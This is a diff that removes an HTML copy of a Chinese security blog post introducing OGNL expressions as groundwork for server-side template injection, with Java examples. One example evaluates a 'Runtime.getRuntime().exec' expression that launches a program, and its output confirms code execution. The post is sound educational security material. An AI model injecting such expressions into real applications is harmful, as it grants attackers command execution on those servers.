@@ -1,943 +1,440 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>Ognl_SSTI总结 - P1n93r - 博学而精一</title>
-  <meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-<meta name="theme-color" content="#f8f5ec" />
-<meta name="msapplication-navbutton-color" content="#f8f5ec">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
-
-
-<meta name="author" content="P1n93r" /><meta name="description" content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，" /><meta name="keywords" content="Security, Java, Web, Android" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.96.0 with theme even" />
-
-
-<link rel="canonical" href="https://p1n93r.github.io/post/security/ognl_ssti%E6%80%BB%E7%BB%93/" />
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/manifest.json">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
-
-
-<meta property="og:title" content="Ognl_SSTI总结" />
-<meta property="og:description" content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://p1n93r.github.io/post/security/ognl_ssti%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-06-15T17:07:36+08:00" />
-<meta property="article:modified_time" content="2021-06-15T17:07:36+08:00" />
-
-<meta itemprop="name" content="Ognl_SSTI总结">
-<meta itemprop="description" content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"><meta itemprop="datePublished" content="2021-06-15T17:07:36+08:00" />
-<meta itemprop="dateModified" content="2021-06-15T17:07:36+08:00" />
-<meta itemprop="wordCount" content="3169">
-<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Ognl_SSTI总结"/>
-<meta name="twitter:description" content="Ognl介绍 Ognl，即对象视图导航语言（Object Graphic Navigation Language）。 使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，"/>
-
-<!--[if lte IE 9]>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-<![endif]-->
-
-<!--[if lt IE 9]>
-  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-<![endif]-->
-
-</head>
-<body>
-  <div id="mobile-navbar" class="mobile-navbar">
-  <div class="mobile-header-logo">
-    <a href="/" class="logo">P1n93r</a>
-  </div>
-  <div class="mobile-navbar-icon">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
-</div>
-<nav id="mobile-menu" class="mobile-menu slideout-menu">
-  <ul class="mobile-menu-list">
-    <a href="/">
-        <li class="mobile-menu-item">Home</li>
-      </a><a href="/post/">
-        <li class="mobile-menu-item">Archives</li>
-      </a><a href="/tags/">
-        <li class="mobile-menu-item">Tags</li>
-      </a><a href="/categories/">
-        <li class="mobile-menu-item">Categories</li>
-      </a><a href="/about/">
-        <li class="mobile-menu-item">About</li>
-      </a>
-  </ul>
-
-  
-
-
-</nav>
-
-  <div class="container" id="mobile-panel">
-    <header id="header" class="header">
-        <div class="logo-wrapper">
-  <a href="/" class="logo">P1n93r</a>
-</div>
-
-
-
-
-
-<nav class="site-navbar">
-  <ul id="menu" class="menu">
-    <li class="menu-item">
-        <a class="menu-item-link" href="/">Home</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/post/">Archives</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/tags/">Tags</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/categories/">Categories</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="/about/">About</a>
-      </li>
-  </ul>
-</nav>
-
-    </header>
-
-    <main id="main" class="main">
-      <div class="content-wrapper">
-        <div id="content" class="content">
-          <article class="post">
-    
-    <header class="post-header">
-      <h1 class="post-title">Ognl_SSTI总结</h1>
-
-      <div class="post-meta">
-        <span class="post-time"> 2021-06-15 </span>
-        <div class="post-category">
-            <a href="/categories/security/"> security </a>
-            </div>
-          <span class="more-meta"> 约 3169 字 </span>
-          <span class="more-meta"> 预计阅读 7 分钟 </span>
-        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
-      </div>
-    </header>
-
-    <div class="post-toc" id="post-toc">
-  <h2 class="post-toc-title">文章目录</h2>
-  <div class="post-toc-content always-active">
-    <nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#ognl介绍">Ognl介绍</a></li>
-        <li><a href="#ognl三要素">Ognl三要素</a></li>
-        <li><a href="#ognl基本语法">Ognl基本语法</a></li>
-        <li><a href="#ognl其他特性">Ognl其他特性</a></li>
-        <li><a href="#ognl-ssti-sink">Ognl SSTI Sink</a></li>
-        <li><a href="#参考链接">参考链接</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-  </div>
-</div>
-    <div class="post-content">
-      <h2 id="ognl介绍">Ognl介绍</h2>
-<p>Ognl，即对象视图导航语言（Object Graphic Navigation Language）。</p>
-<p>使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，调用 Java 对象的方法，以及实现类型转换等。</p>
-<p>OGNL 具有以下特点：</p>
-<ul>
-<li>支持对象方法调用。如 <code>objName.methodName()</code>。</li>
-<li>支持类静态方法调用和值访问，表达式的格式为 <code>@[类全名（包括包路径）]@[方法名|值名]</code> 。如 <code>@java.lang.String@format('fruit%s','frt')</code> 。</li>
-<li>支持赋值操作和表达式串联。如 <code>price=100</code> ，<code>discount=0.8</code> ，在方法 <code>calculatePrice()</code> 中进行乘法计算会返回 80。</li>
-<li><strong>访问 OGNL 上下文（OGNL context）和 ActionContext</strong>。</li>
-<li>操作集合对象。</li>
-</ul>
-<h2 id="ognl三要素">Ognl三要素</h2>
-<p><strong>(1) 表达式</strong></p>
-<p>表达式是整个 OGNL 的核心，OGNL 会根据表达式到对象中取值。所有 OGNL 操作都是针对表达式解析后进行的，它表明了此次 OGNL 操作要“做什么”。实际上，表达式就是一个带有语法含义的字符串，这个字符串规定了操作的类型和操作的内容。</p>
-<p><strong>(2) 上下文对象</strong></p>
-<p>上下文对象规定了 OGNL 操作“在哪里进行”。<code>context</code> 对象是一个 <code>Map</code> 类型的对象，在表达式中访问 <code>context</code>  中的对象，需要使用 <code>#</code> 号加对象名称，即 <code># 对象名称</code> 的形式。例如要获取 <code>context</code> 对象中 <code>user</code> 对象的 <code>username</code>  值，可以如下书写：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#user.username
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(3) 根对象</strong></p>
-<p>根对象可以理解为 OGNL 的操作对象，OGNL 可以对根对象进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境。</p>
-<h2 id="ognl基本语法">Ognl基本语法</h2>
-<p><strong>(1) 对root对象的访问</strong></p>
-<p>支持链式访问：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="o">.</span><span class="na">setAge</span><span class="o">(</span><span class="n">22</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;p1n93r&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Address</span> <span class="n">address</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Address</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">address</span><span class="o">.</span><span class="na">setProvince</span><span class="o">(</span><span class="s">&#34;湖南&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">address</span><span class="o">.</span><span class="na">setCity</span><span class="o">(</span><span class="s">&#34;常德&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">user</span><span class="o">.</span><span class="na">setAddress</span><span class="o">(</span><span class="n">address</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;name = &#34;</span><span class="o">+</span><span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;age = &#34;</span><span class="o">+</span><span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="s">&#34;age&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// ognl支持链式调用
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;address = &#34;</span><span class="o">+</span><span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="s">&#34;address.province&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">));</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name = p1n93r
-</span></span><span class="line"><span class="cl">age = 22
-</span></span><span class="line"><span class="cl">address = 湖南
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(2) 对上下文对象的访问</strong></p>
-<p>向上面那样，如果不设置上下文对象，则 <code>Ognl</code> 会创建一个空的 <code>context</code> ：</p>
-<p><img src="/media/image-20210914100428914.png" alt="image-20210914100428914"></p>
-<p>现在测试设置 <code>context</code> 时，访问 <code>context</code> 对象，代码如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testAccessContext</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">rootUser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">rootUser</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;rootUser&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">contextUser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">contextUser</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;contextUser&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;(</span><span class="n">2</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;init&#34;</span><span class="o">,</span> <span class="s">&#34;hello&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;contextUser&#34;</span><span class="o">,</span> <span class="n">contextUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">express</span> <span class="o">=</span> <span class="s">&#34;#contextUser.name&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">express1</span> <span class="o">=</span> <span class="s">&#34;#init&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">rootUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">value1</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express1</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span> <span class="n">rootUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express1</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#contextUser.name = contextUser
-</span></span><span class="line"><span class="cl">#init = hello
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><em><strong>注意</strong></em> ： <code>#</code> 只支持访问 <code>context</code> 对象，不支持访问 <code>root</code> 对象；</p>
-<p><strong>(3) 对静态成员的访问</strong></p>
-<p>在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式为 <code>@[class]@[field/method ()]</code> 。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public static void testAccessStatic()throws Exception{
-</span></span><span class="line"><span class="cl">    String[] expressions = {
-</span></span><span class="line"><span class="cl">            &#34;@java.lang.System@out.println(\&#34;hello,I&#39;m an static method access test\&#34;)&#34;,
-</span></span><span class="line"><span class="cl">            &#34;@java.lang.Integer@MAX_VALUE&#34;,
-</span></span><span class="line"><span class="cl">            &#34;@java.lang.Runtime@getRuntime().exec(\&#34;calc\&#34;)&#34;
-</span></span><span class="line"><span class="cl">    };
-</span></span><span class="line"><span class="cl">    for (String express : expressions) {
-</span></span><span class="line"><span class="cl">        Object value = Ognl.getValue(express, null);
-</span></span><span class="line"><span class="cl">        System.out.println(express+&#34; = &#34;+value);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hello,I&#39;m an static method access test
-</span></span><span class="line"><span class="cl">@java.lang.System@out.println(&#34;hello,I&#39;m an static method access test&#34;) = null
-</span></span><span class="line"><span class="cl">@java.lang.Integer@MAX_VALUE = 2147483647
-</span></span><span class="line"><span class="cl">@java.lang.Runtime@getRuntime().exec(&#34;calc&#34;) = java.lang.ProcessImpl@28ba21f3
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(4) 方法的调用</strong></p>
-<p>可以直接访问 <code>root</code> 对象的 <code>public</code> 方法，以及 <code>context</code> 对象的 <code>public</code> 方法。示例代码如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testAccessMethod</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">rootUser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">contextUser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;(</span><span class="n">2</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">,</span> <span class="s">&#34;p1n93r&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;contextUser&#34;</span><span class="o">,</span> <span class="n">contextUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">expressions</span> <span class="o">=</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;setName(#username)&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#contextUser.setName(&#39;contextUser&#39;)&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">    <span class="o">};</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;rootUser = &#34;</span><span class="o">+</span><span class="n">rootUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;contextUser = &#34;</span><span class="o">+</span><span class="n">contextUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;:::::::::::::::::::::::::::::&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">express</span> <span class="o">:</span> <span class="n">expressions</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span><span class="n">context</span><span class="o">,</span><span class="n">rootUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;:::::::::::::::::::::::::::::&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;rootUser = &#34;</span><span class="o">+</span><span class="n">rootUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;contextUser = &#34;</span><span class="o">+</span><span class="n">contextUser</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rootUser = User(name=null, age=null, address=null)
-</span></span><span class="line"><span class="cl">contextUser = User(name=null, age=null, address=null)
-</span></span><span class="line"><span class="cl">:::::::::::::::::::::::::::::
-</span></span><span class="line"><span class="cl">setName(#username) = null
-</span></span><span class="line"><span class="cl">#contextUser.setName(&#39;contextUser&#39;) = null
-</span></span><span class="line"><span class="cl">:::::::::::::::::::::::::::::
-</span></span><span class="line"><span class="cl">rootUser = User(name=p1n93r, age=null, address=null)
-</span></span><span class="line"><span class="cl">contextUser = User(name=contextUser, age=null, address=null)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(5) 对数组和集合的访问</strong></p>
-<p>OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testAccessCollections</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">strings</span>  <span class="o">=</span> <span class="o">{</span><span class="s">&#34;str-aa&#34;</span><span class="o">,</span> <span class="s">&#34;str-bb&#34;</span><span class="o">};</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;list-aa&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;list-bb&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;key1&#34;</span><span class="o">,</span> <span class="s">&#34;value1&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;key2&#34;</span><span class="o">,</span> <span class="s">&#34;value2&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;list&#34;</span><span class="o">,</span> <span class="n">list</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;strings&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;map&#34;</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
